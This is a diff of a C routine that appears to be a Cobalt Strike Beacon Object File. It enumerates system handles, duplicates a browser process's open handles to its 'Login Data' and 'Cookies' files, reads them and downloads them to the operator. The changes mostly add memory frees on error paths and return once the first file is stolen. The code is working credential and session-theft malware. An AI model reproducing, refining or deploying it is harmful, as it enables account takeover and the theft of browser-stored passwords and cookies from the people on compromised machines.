@@ -406,6 +406,7 @@ BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName) {
     DWORD dwNeeded = 0;
     DWORD dwSize = 0xffffff / 2;
     shi = (SYSTEM_HANDLE_INFORMATION_EX *)KERNEL32$GlobalAlloc(GPTR, dwSize);
+    
     //utilize NtQueryStemInformation to list all handles on system
     NTSTATUS status = NTDLL$NtQuerySystemInformation(SystemHandleInformationEx, shi, dwSize, &dwNeeded);
     if(status == STATUS_INFO_LENGTH_MISMATCH)
@@ -415,21 +416,20 @@ BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName) {
         if (dwSize == NULL)
         {
             BeaconPrintf(CALLBACK_ERROR, "Failed to reallocate memory for handle information.\n");
+            KERNEL32$GlobalFree(shi);
             return FALSE;
         }
-        
     }
     status = NTDLL$NtQuerySystemInformation(SystemHandleInformationEx, shi, dwSize, &dwNeeded);
     if(status != 0)
     {
         BeaconPrintf(CALLBACK_ERROR,"NtQuerySystemInformation failed with status 0x%x.\n",status);
+        KERNEL32$GlobalFree(shi);
         return FALSE;
     }
     //BeaconPrintf(CALLBACK_OUTPUT,"Handle Count %d\n", shi->NumberOfHandles);
     DWORD i = 0;
     BOOL firstHandle = TRUE;
-    POBJECT_NAME_INFORMATION objectNameInfo = (POBJECT_NAME_INFORMATION)malloc(0x1000);
-
     //iterate through each handle and find our PID and a handle to a file
     for(i = 0; i < shi->NumberOfHandles; i++) {
         SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX handle = shi->Handles[i];
@@ -439,11 +439,11 @@ BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName) {
             ULONG returnLength = 0;
             NTSTATUS ret = 0;
             if(handle.GrantedAccess != 0x001a019f || ( handle.HandleAttributes != 0x2 && handle.GrantedAccess == 0x0012019f)) {
-            
                 HANDLE hProc = KERNEL32$OpenProcess(PROCESS_DUP_HANDLE, FALSE, PID);
                 if(hProc == INVALID_HANDLE_VALUE) {
                     BeaconPrintf(CALLBACK_ERROR,"OpenProcess failed %d\n", KERNEL32$GetLastError());
                     KERNEL32$GlobalFree(shi);
+                    free(objectNameInfo);
                     return FALSE;
                 }
 
@@ -464,11 +464,11 @@ BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName) {
                 if (ret != 0)
                 {
                     BeaconPrintf(CALLBACK_ERROR,"Failed NtQueryObject");
+                    KERNEL32$GlobalFree(shi);
+                    free(objectNameInfo);
                     return FALSE;
-                    //ret = NTDLL$NtQueryObject(hDuplicate,ObjectNameInformation, objectNameInfo, returnLength, &returnLength);
                 }
                 if (ret == 0 && objectNameInfo->Name.Length > 0){
-                    //BeaconPrintf(CALLBACK_OUTPUT, "Handle Name: %.*ws\n", objectNameInfo->Name.Length / sizeof(WCHAR), objectNameInfo->Name.Buffer);
                     char handleName[1024];
                     sprintf(handleName, "%.*ws", objectNameInfo->Name.Length / sizeof(WCHAR), objectNameInfo->Name.Buffer);
 
@@ -477,15 +477,15 @@ BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName) {
                     if (ret != 0)
                     {
                         BeaconPrintf(CALLBACK_ERROR,"Failed NtQueryObject");
+                        KERNEL32$GlobalFree(shi);
+                        free(objectTypeInfo);
+                        free(objectNameInfo);
                         return FALSE;
-                        //ret = NTDLL$NtQueryObject(hDuplicate,ObjectTypeInformation, objectTypeInfo, returnLength, &returnLength);
                     }
                     if (ret == 0 && (MSVCRT$strcmp(objectTypeInfo,"File"))){
                         //BeaconPrintf(CALLBACK_OUTPUT, "%s\n", handleName);
                         //BeaconPrintf(CALLBACK_OUTPUT, "%d\n", MSVCRT$strlen(handleName));
                         if (MSVCRT$strstr(handleName, browserFile) != NULL && (MSVCRT$strcmp(&handleName[MSVCRT$strlen(handleName) - 4], "Data") == 0 || MSVCRT$strcmp(&handleName[MSVCRT$strlen(handleName) - 7], "Cookies") == 0)){
-
-                        //if (MSVCRT$strstr(handleName, browserFile) != NULL){
 
                             BeaconPrintf(CALLBACK_OUTPUT,"%s WAS FOUND\n", browserFile);
                             BeaconPrintf(CALLBACK_OUTPUT, "Handle Name: %.*ws\n", objectNameInfo->Name.Length / sizeof(WCHAR), objectNameInfo->Name.Buffer);
@@ -500,7 +500,10 @@ BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName) {
                             download_file(downloadFileName,buffer, dwFileSize);
                             
                             KERNEL32$GlobalFree(buffer);
-                            continue;
+                            KERNEL32$GlobalFree(shi);
+                            free(objectTypeInfo);
+                            free(objectNameInfo);
+                            return TRUE;
                         }
                         
                     }else{
